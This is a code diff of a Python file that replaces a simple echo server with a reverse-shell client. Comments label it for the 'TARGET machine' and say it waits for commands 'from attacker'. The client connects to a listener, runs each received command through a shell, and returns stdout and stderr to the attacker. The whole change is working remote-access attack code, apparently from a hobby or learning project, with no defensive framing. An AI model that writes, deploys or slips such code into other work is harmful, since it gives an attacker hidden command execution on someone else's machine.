@@ -1,3 +1,4 @@
+#server to be setup on TARGET machine
 import socket
 import json
 import os
@@ -5,22 +6,27 @@ import sys
 import subprocess
 import threading
 import time
+from ctypes.wintypes import INT
 
 ip = '127.0.0.1'
 port = 4141
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.bind((ip, port))
-    s.listen()
-    print("listening for connections...")
-    conn, addr = s.accept()
-    
-    with conn:
-        print(f"connected by {addr}")
-        while True:
-            data = conn.recv(1024)
-            if not data:
-                break
-            print(f"Received {data!r}")
-            conn.sendall(data)#can use this to send data back
-print("server closed")
+client = socket.socket()
+
+client.connect((ip, port))
+print("connected")
+
+#TODO put getting command in a function (step 3)
+
+# main loop
+while True:
+    #wait for a command from attacker
+    command = client.recv(1024)
+    command = command.decode()
+    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    output = op.stdout.read()
+    output_error = op.stderr.read()
+    #send response/output back to attacker
+    #print(f"sending: {output.decode() + output_error.decode()}")
+    print(f"sent output from command: {command}")
+    client.send(output + output_error)
